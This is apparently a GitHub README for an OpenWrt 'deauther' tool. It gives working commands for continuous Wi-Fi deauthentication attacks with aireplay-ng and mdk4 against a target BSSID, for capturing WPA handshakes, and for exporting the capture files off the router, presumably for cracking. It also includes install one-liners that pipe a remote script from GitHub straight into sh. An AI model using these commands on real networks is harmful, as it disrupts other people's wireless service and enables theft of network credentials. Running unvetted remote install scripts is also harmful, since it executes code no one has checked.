# openwrt deauther based on airplay-ng 
- Functions similar on kali
- Also it can capture WPA Handshakes

## Root access 
```sh
ssh root@192.168.1.1
```
```sh
telnet 192.168.1.1
```
# Mipsel_24kc only 
> Any Openwrt running in this processors is supported by [mdk4](https://downloads.openwrt.org/releases/23.05.5/targets/ramips/)
 - mt7620
 - mt7621
 - mt76x8
 - rt288x
 - rt305x
 - rt3883
```sh
opkg update && wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/mdk4_4.2-5_mipsel_24kc.ipk && opkg install mdk4.ipk
```

## Auto install 
```sh

opkg update && wget -qO- https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/install.sh | sh
````

# Using aireplay-ng 
```sh
sh mon.sh && airodump-ng mon0
```
> ctrl + c
```sh
aireplay-ng --deauth 0 -a (Mac BSSID)
```

# Using mdk4
```sh
sh mon.sh && mdk4 mon0 d
```
## Manual
> More info
 - aireplay-ng --help
 - airodump-ng --help
 - aircrack-ng --help

`iw phy phy0 interface add mon0 type monitor`

`ip link set mon0 up`

`airodump-ng mon0`

`aireplay-ng mon0 --deauth 0 -a 32:AA:E4:18:90:45 --ignore-negative-one`

- -a | bssid -a (32:AA:E4:18:90:45)

## Export handshake or files from openwrt to local storage
> [!Tip]
> install SFTP server in both system in order that SCP to work
> Openwrt: opkg install openssh-sftp-server
> Linux/Termux: apt install openssh-sftp-server

- Termux Terminal 
```sh
scp root@192.168.1.1:*.cap storage/downloads
```
- Kali terminal 
```sh
scp root@192.168.1.1:*.cap /home/*/Downloads
```

> [Hint!]
 - *.cap - export any name with .cap file format
